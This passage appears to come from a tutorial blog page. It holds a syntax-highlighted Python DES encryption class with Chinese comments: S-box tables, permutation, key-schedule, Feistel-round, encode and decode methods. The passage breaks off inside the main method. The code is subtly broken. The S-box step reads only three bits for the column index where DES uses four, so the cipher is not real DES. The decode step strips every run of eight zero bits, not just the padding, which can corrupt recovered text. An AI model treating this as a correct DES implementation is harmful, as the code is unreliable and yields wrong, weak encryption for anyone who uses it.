class="number">0xc</span>, <span class="number">0x9</span>, <span class="number">0x7</span>, <span class="number">0x3</span>, <span class="number">0xa</span>, <span class="number">0x5</span>, <span class="number">0x0</span>,</span><br><span class="line">                <span class="number">0xf</span>, <span class="number">0xc</span>, <span class="number">0x8</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0x9</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0x5</span>, <span class="number">0xb</span>, <span class="number">0x3</span>, <span class="number">0xe</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0xd</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0xf</span>, <span class="number">0x1</span>, <span class="number">0x8</span>, <span class="number">0xe</span>, <span class="number">0x6</span>, <span class="number">0xb</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0x9</span>, <span class="number">0x7</span>, <span class="number">0x2</span>, <span class="number">0xd</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x5</span>, <span class="number">0xa</span>,</span><br><span class="line">                <span class="number">0x3</span>, <span class="number">0xd</span>, <span class="number">0x4</span>, <span class="number">0x7</span>, <span class="number">0xf</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0xe</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0xb</span>, <span class="number">0x5</span>,</span><br><span class="line">                <span class="number">0x0</span>, <span class="number">0xe</span>, <span class="number">0x7</span>, <span class="number">0xb</span>, <span class="number">0xa</span>, <span class="number">0x4</span>, <span class="number">0xd</span>, <span class="number">0x1</span>, <span class="number">0x5</span>, <span class="number">0x8</span>, <span class="number">0xc</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0xf</span>,</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x8</span>, <span class="number">0xa</span>, <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0xf</span>, <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0xb</span>, <span class="number">0x6</span>, <span class="number">0x7</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x5</span>, <span class="number">0xe</span>, <span class="number">0x9</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x9</span>, <span class="number">0xe</span>, <span class="number">0x6</span>, <span class="number">0x3</span>, <span class="number">0xf</span>, <span class="number">0x5</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0xc</span>, <span class="number">0x7</span>, <span class="number">0xb</span>, <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0x8</span>,</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x9</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0x6</span>, <span class="number">0xa</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0x5</span>, <span class="number">0xe</span>, <span class="number">0xc</span>, <span class="number">0xb</span>, <span class="number">0xf</span>, <span class="number">0x1</span>,</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x6</span>, <span class="number">0x4</span>, <span class="number">0x9</span>, <span class="number">0x8</span>, <span class="number">0xf</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0xb</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x5</span>, <span class="number">0xa</span>, <span class="number">0xe</span>, <span class="number">0x7</span>,</span><br><span class="line">                <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0x8</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0xf</span>, <span class="number">0xe</span>, <span class="number">0x3</span>, <span class="number">0xb</span>, <span class="number">0x5</span>, <span class="number">0x2</span>, <span class="number">0xc</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0x7</span>, <span class="number">0xd</span>, <span class="number">0xe</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0xa</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0x5</span>, <span class="number">0xb</span>, <span class="number">0xc</span>, <span class="number">0x4</span>, <span class="number">0xf</span>,</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x8</span>, <span class="number">0xb</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0x7</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0xe</span>, <span class="number">0x9</span>,</span><br><span class="line">                <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0xc</span>, <span class="number">0xb</span>, <span class="number">0x7</span>, <span class="number">0xd</span>, <span class="number">0xf</span>, <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0xe</span>, <span class="number">0x5</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0x4</span>,</span><br><span class="line">                <span class="number">0x3</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0xa</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0x8</span>, <span class="number">0x9</span>, <span class="number">0x4</span>, <span class="number">0x5</span>, <span class="number">0xb</span>, <span class="number">0xc</span>, <span class="number">0x7</span>, <span class="number">0x2</span>, <span class="number">0xe</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x4</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0xa</span>, <span class="number">0xb</span>, <span class="number">0x6</span>, <span class="number">0x8</span>, <span class="number">0x5</span>, <span class="number">0x3</span>, <span class="number">0xf</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0xe</span>, <span class="number">0x9</span>,</span><br><span class="line">                <span class="number">0xe</span>, <span class="number">0xb</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x4</span>, <span class="number">0x7</span>, <span class="number">0xd</span>, <span class="number">0x1</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0xf</span>, <span class="number">0xa</span>, <span class="number">0x3</span>, <span class="number">0x9</span>, <span class="number">0x8</span>, <span class="number">0x6</span>,</span><br><span class="line">                <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0xb</span>, <span class="number">0xa</span>, <span class="number">0xd</span>, <span class="number">0x7</span>, <span class="number">0x8</span>, <span class="number">0xf</span>, <span class="number">0x9</span>, <span class="number">0xc</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0xe</span>,</span><br><span class="line">                <span class="number">0xb</span>, <span class="number">0x8</span>, <span class="number">0xc</span>, <span class="number">0x7</span>, <span class="number">0x1</span>, <span class="number">0xe</span>, <span class="number">0x2</span>, <span class="number">0xd</span>, <span class="number">0x6</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x9</span>, <span class="number">0xa</span>, <span class="number">0x4</span>, <span class="number">0x5</span>, <span class="number">0x3</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0xc</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0xf</span>, <span class="number">0x9</span>, <span class="number">0x2</span>, <span class="number">0x6</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0xd</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0xe</span>, <span class="number">0x7</span>, <span class="number">0x5</span>, <span class="number">0xb</span>,</span><br><span class="line">                <span class="number">0xa</span>, <span class="number">0xf</span>, <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0x7</span>, <span class="number">0xc</span>, <span class="number">0x9</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0xe</span>, <span class="number">0x0</span>, <span class="number">0xb</span>, <span class="number">0x3</span>, <span class="number">0x8</span>,</span><br><span class="line">                <span class="number">0x9</span>, <span class="number">0xe</span>, <span class="number">0xf</span>, <span class="number">0x5</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0xc</span>, <span class="number">0x3</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x4</span>, <span class="number">0xa</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0xb</span>, <span class="number">0x6</span>,</span><br><span class="line">                <span class="number">0x4</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x9</span>, <span class="number">0x5</span>, <span class="number">0xf</span>, <span class="number">0xa</span>, <span class="number">0xb</span>, <span class="number">0xe</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x8</span>, <span class="number">0xd</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0x4</span>, <span class="number">0xb</span>, <span class="number">0x2</span>, <span class="number">0xe</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x8</span>, <span class="number">0xd</span>, <span class="number">0x3</span>, <span class="number">0xc</span>, <span class="number">0x9</span>, <span class="number">0x7</span>, <span class="number">0x5</span>, <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0x1</span>,</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0xb</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0x9</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0xe</span>, <span class="number">0x3</span>, <span class="number">0x5</span>, <span class="number">0xc</span>, <span class="number">0x2</span>, <span class="number">0xf</span>, <span class="number">0x8</span>, <span class="number">0x6</span>,</span><br><span class="line">                <span class="number">0x1</span>, <span class="number">0x4</span>, <span class="number">0xb</span>, <span class="number">0xd</span>, <span class="number">0xc</span>, <span class="number">0x3</span>, <span class="number">0x7</span>, <span class="number">0xe</span>, <span class="number">0xa</span>, <span class="number">0xf</span>, <span class="number">0x6</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x5</span>, <span class="number">0x9</span>, <span class="number">0x2</span>,</span><br><span class="line">                <span class="number">0x6</span>, <span class="number">0xb</span>, <span class="number">0xd</span>, <span class="number">0x8</span>, <span class="number">0x1</span>, <span class="number">0x4</span>, <span class="number">0xa</span>, <span class="number">0x7</span>, <span class="number">0x9</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0xf</span>, <span class="number">0xe</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0xc</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0x4</span>, <span class="number">0x6</span>, <span class="number">0xf</span>, <span class="number">0xb</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0x9</span>, <span class="number">0x3</span>, <span class="number">0xe</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0xc</span>, <span class="number">0x7</span>,</span><br><span class="line">                <span class="number">0x1</span>, <span class="number">0xf</span>, <span class="number">0xd</span>, <span class="number">0x8</span>, <span class="number">0xa</span>, <span class="number">0x3</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0xc</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0xb</span>, <span class="number">0x0</span>, <span class="number">0xe</span>, <span class="number">0x9</span>, <span class="number">0x2</span>,</span><br><span class="line">                <span class="number">0x7</span>, <span class="number">0xb</span>, <span class="number">0x4</span>, <span class="number">0x1</span>, <span class="number">0x9</span>, <span class="number">0xc</span>, <span class="number">0xe</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0xa</span>, <span class="number">0xd</span>, <span class="number">0xf</span>, <span class="number">0x3</span>, <span class="number">0x5</span>, <span class="number">0x8</span>,</span><br><span class="line">                <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0xe</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0xa</span>, <span class="number">0x8</span>, <span class="number">0xd</span>, <span class="number">0xf</span>, <span class="number">0xc</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0xb</span>,</span><br><span class="line">            ],</span><br><span class="line">        ]  <span class="comment"># 16进制表示S盒的数据，S盒是为了将48位转换为32位，有8个盒子</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__substitution</span>(<span class="params">self, table: <span class="built_in">str</span>, self_table: <span class="built_in">list</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param table: 需要进行置换的列表,是一个01字符串</span></span><br><span class="line"><span class="string">        :param self_table: 置换表，在__init__中初始化了</span></span><br><span class="line"><span class="string">        :return: 返回置换后的01字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        sub_result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> self_table:</span><br><span class="line">            sub_result += table[i - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> sub_result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">str2bin</span>(<span class="params">self, string: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        将明文转为二进制字符串:</span></span><br><span class="line"><span class="string">        :param string: 任意字符串</span></span><br><span class="line"><span class="string">        :return:二进制字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        plaintext_list = <span class="built_in">list</span>(<span class="built_in">bytes</span>(string, <span class="string">&#x27;utf8&#x27;</span>))  <span class="comment"># 将字符串转成bytes类型，再转成list</span></span><br><span class="line">        result = []  <span class="comment"># 定义返回结果</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> plaintext_list:</span><br><span class="line">            result.append(<span class="built_in">bin</span>(num)[<span class="number">2</span>:].zfill(<span class="number">8</span>))  <span class="comment"># 将列表的每个元素转成二进制字符串，8位宽度</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(result)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bin2str</span>(<span class="params">self, binary: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        二进制字符串转成字符串</span></span><br><span class="line"><span class="string">        :param binary:</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        list_bin = [binary[i:i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary), <span class="number">8</span>)]  <span class="comment"># 对二进制字符串进行切分，每8位为一组</span></span><br><span class="line">        list_int = []</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> list_bin:</span><br><span class="line">            list_int.append(<span class="built_in">int</span>(b, <span class="number">2</span>))  <span class="comment"># 对二进制转成int</span></span><br><span class="line">        result = <span class="built_in">bytes</span>(list_int).decode()  <span class="comment"># 将列表转成bytes，在进行解码，得到字符串</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__bin2int</span>(<span class="params">self, binary: <span class="built_in">str</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        由于加密之后的二进制无法直接转成字符，有不可见字符在，utf8可能无法解码，所以需要将二进制字符串每8位转成int型号列表，用于转成bytes再转hex</span></span><br><span class="line"><span class="string">        :param binary: 二进制字符串</span></span><br><span class="line"><span class="string">        :return: int型列表</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        list_bin = [binary[i:i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary), <span class="number">8</span>)]  <span class="comment"># 对二进制字符串进行切分，每8位为一组</span></span><br><span class="line">        list_int = []</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> list_bin:</span><br><span class="line">            list_int.append(<span class="built_in">int</span>(b, <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">return</span> list_int</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__int2bin</span>(<span class="params">self, list_int: <span class="built_in">list</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> list_int:</span><br><span class="line">            result.append(<span class="built_in">bin</span>(num)[<span class="number">2</span>:].zfill(<span class="number">8</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__get_block_list</span>(<span class="params">self, binary: <span class="built_in">str</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        对明文二进制串进行切分，每64位为一块，DES加密以64位为一组进行加密的</span></span><br><span class="line"><span class="string">        :type binary: 二进制串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        len_binary = <span class="built_in">len</span>(binary)</span><br><span class="line">        <span class="keyword">if</span> len_binary % <span class="number">64</span> != <span class="number">0</span>:</span><br><span class="line">            binary_block = binary + (<span class="string">&quot;0&quot;</span> * (<span class="number">64</span> - (len_binary % <span class="number">64</span>)))</span><br><span class="line">            <span class="keyword">return</span> [binary_block[i:i + <span class="number">64</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_block), <span class="number">64</span>)]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> [binary[j:j + <span class="number">64</span>] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary), <span class="number">64</span>)]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">modify_secretkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        修改默认密钥函数</span></span><br><span class="line"><span class="string">        :return: None</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;当前二进制形式密钥为:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.K))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;当前字符串形式密钥为：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.bin2str(self.K)))</span><br><span class="line">        newkey = <span class="built_in">input</span>(<span class="string">&quot;输入新的密钥（长度为8）：&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(newkey) != <span class="number">8</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;密钥长度不符合，请重新输入：&quot;</span>)</span><br><span class="line">            self.modify_secretkey()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            bin_key = self.str2bin(newkey)</span><br><span class="line">            self.K = bin_key</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;当前二进制形式密钥为:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.K))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__f_funtion</span>(<span class="params">self, right: <span class="built_in">str</span>, key: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param right: 明文二进制的字符串加密过程的右半段</span></span><br><span class="line"><span class="string">        :param key: 当前轮数的密钥</span></span><br><span class="line"><span class="string">        :return: 进行E扩展，与key异或操作，S盒操作后返回32位01字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 对right进行E扩展</span></span><br><span class="line">        e_result = self.__substitution(right, self.E)</span><br><span class="line">        <span class="comment"># 与key 进行异或操作</span></span><br><span class="line">        xor_result = self.__xor_function(e_result, key)</span><br><span class="line">        <span class="comment"># 进入S盒子</span></span><br><span class="line">        s_result = self.__s_box(xor_result)</span><br><span class="line">        <span class="comment"># 进行P置换</span></span><br><span class="line">        p_result = self.__substitution(s_result, self.P)</span><br><span class="line">        <span class="keyword">return</span> p_result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__get_key_list</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :return: 返回加密过程中16轮的子密钥</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        key = self.__substitution(self.K, self.k1)</span><br><span class="line">        left_key = key[<span class="number">0</span>:<span class="number">28</span>]</span><br><span class="line">        right_key = key[<span class="number">28</span>:<span class="number">56</span>]</span><br><span class="line">        keys = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">17</span>):</span><br><span class="line">            move = self.k0[i - <span class="number">1</span>]</span><br><span class="line">            move_left = left_key[move:<span class="number">28</span>] + left_key[<span class="number">0</span>:move]</span><br><span class="line">            move_right = right_key[move:<span class="number">28</span>] + right_key[<span class="number">0</span>:move]</span><br><span class="line">            left_key = move_left</span><br><span class="line">            right_key = move_right</span><br><span class="line">            move_key = left_key + right_key</span><br><span class="line">            ki = self.__substitution(move_key, self.k2)</span><br><span class="line">            keys.append(ki)</span><br><span class="line">        <span class="keyword">return</span> keys</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__xor_function</span>(<span class="params">self, xor1: <span class="built_in">str</span>, xor2: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param xor1: 01字符串</span></span><br><span class="line"><span class="string">        :param xor2: 01字符串</span></span><br><span class="line"><span class="string">        :return: 异或操作返回的结果</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        size = <span class="built_in">len</span>(xor1)</span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, size):</span><br><span class="line">            result += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> xor1[i] == xor2[i] <span class="keyword">else</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__s_box</span>(<span class="params">self, xor_result: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param xor_result: 48位01字符串</span></span><br><span class="line"><span class="string">        :return: 返回32位01字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">            <span class="comment"># 将48位数据分为6组，循环进行</span></span><br><span class="line">            block = xor_result[i * <span class="number">6</span>:(i + <span class="number">1</span>) * <span class="number">6</span>]</span><br><span class="line">            line = <span class="built_in">int</span>(block[<span class="number">0</span>] + block[<span class="number">5</span>], <span class="number">2</span>)</span><br><span class="line">            colmn = <span class="built_in">int</span>(block[<span class="number">1</span>:<span class="number">4</span>], <span class="number">2</span>)</span><br><span class="line">            res = <span class="built_in">bin</span>(self.S[i][line*<span class="number">16</span> + colmn])[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(res) &lt; <span class="number">4</span>:</span><br><span class="line">                res = <span class="string">&#x27;0&#x27;</span> * (<span class="number">4</span> - <span class="built_in">len</span>(res)) + res</span><br><span class="line">            result += res</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iteration</span>(<span class="params">self, bin_plaintext: <span class="built_in">str</span>, key_list: <span class="built_in">list</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param bin_plaintext: 01字符串，64位</span></span><br><span class="line"><span class="string">        :param key_list: 密钥列表，共16个</span></span><br><span class="line"><span class="string">        :return: 进行F函数以及和left异或操作之后的字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        left = bin_plaintext[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">        right = bin_plaintext[<span class="number">32</span>:<span class="number">64</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">            next_lift = right</span><br><span class="line">            f_result = self.__f_funtion(right, key_list[i])</span><br><span class="line">            next_right = self.__xor_function(left, f_result)</span><br><span class="line">            left = next_lift</span><br><span class="line">            right = next_right</span><br><span class="line">        bin_plaintext_result = left + right</span><br><span class="line">        <span class="keyword">return</span> bin_plaintext_result[<span class="number">32</span>:] + bin_plaintext_result[:<span class="number">32</span>]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">self, plaintext</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param plaintext: 明文字符串</span></span><br><span class="line"><span class="string">        :return: 密文字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        bin_plaintext = self.str2bin(plaintext)</span><br><span class="line">        bin_plaintext_block = self.__get_block_list(bin_plaintext)</span><br><span class="line">        ciphertext_bin_list = []</span><br><span class="line">        key_list = self.__get_key_list()</span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> bin_plaintext_block:</span><br><span class="line">            <span class="comment"># 初代ip置换</span></span><br><span class="line">            sub_ip = self.__substitution(block, self.ip)</span><br><span class="line">            ite_result = self.__iteration(sub_ip, key_list)</span><br><span class="line">            <span class="comment"># 逆ip置换</span></span><br><span class="line">            sub_ip1 = self.__substitution(ite_result, self.ip1)</span><br><span class="line">            ciphertext_bin_list.append(sub_ip1)</span><br><span class="line">        ciphertext_bin = <span class="string">&#x27;&#x27;</span>.join(ciphertext_bin_list)</span><br><span class="line">        result = self.__bin2int(ciphertext_bin)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(result).<span class="built_in">hex</span>().upper()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">self, ciphertext</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        :param ciphertext: 密文字符串</span></span><br><span class="line"><span class="string">        :return: 明文字符串</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        b_ciphertext = binascii.a2b_hex(ciphertext)</span><br><span class="line">        bin_ciphertext = self.__int2bin(<span class="built_in">list</span>(b_ciphertext))</span><br><span class="line">        bin_plaintext_list = []</span><br><span class="line">        key_list = self.__get_key_list()</span><br><span class="line">        key_list = key_list[::-<span class="number">1</span>]</span><br><span class="line">        bin_ciphertext_block = [bin_ciphertext[i:i + <span class="number">64</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_ciphertext), <span class="number">64</span>)]</span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> bin_ciphertext_block:</span><br><span class="line">            sub_ip = self.__substitution(block, self.ip)</span><br><span class="line">            ite = self.__iteration(sub_ip, key_list)</span><br><span class="line">            sub_ip1 = self.__substitution(ite, self.ip1)</span><br><span class="line">            bin_plaintext_list.append(sub_ip1)</span><br><span class="line">        bin_plaintext = <span class="string">&#x27;&#x27;</span>.join(bin_plaintext_list).replace(<span class="string">&#x27;00000000&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.bin2str(bin_plaintext)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">self</span>):</span><br><span class="line">        select = <span class="built_in">input</span>(<span class="string">&quot;Please 